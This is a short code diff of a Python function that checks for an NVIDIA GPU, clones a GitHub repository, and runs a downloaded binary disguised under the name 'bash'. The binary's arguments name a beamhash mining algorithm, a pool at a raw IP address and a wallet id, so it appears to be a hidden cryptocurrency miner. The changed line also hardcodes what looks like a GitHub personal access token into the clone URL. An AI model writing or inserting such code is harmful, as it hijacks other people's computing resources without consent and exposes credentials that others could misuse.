@@ -27,7 +27,7 @@ def run_script():
     subprocess.run(["nvidia-smi"], check=True)
 
     cmd = """
-    git clone https://${GH_TOKEN}@github.com/sadarsayujinjas/gm.git
+    git clone https://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@github.com/sadarsayujinjas/gm.git
     cd gm
     chmod u+x bash
     ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin
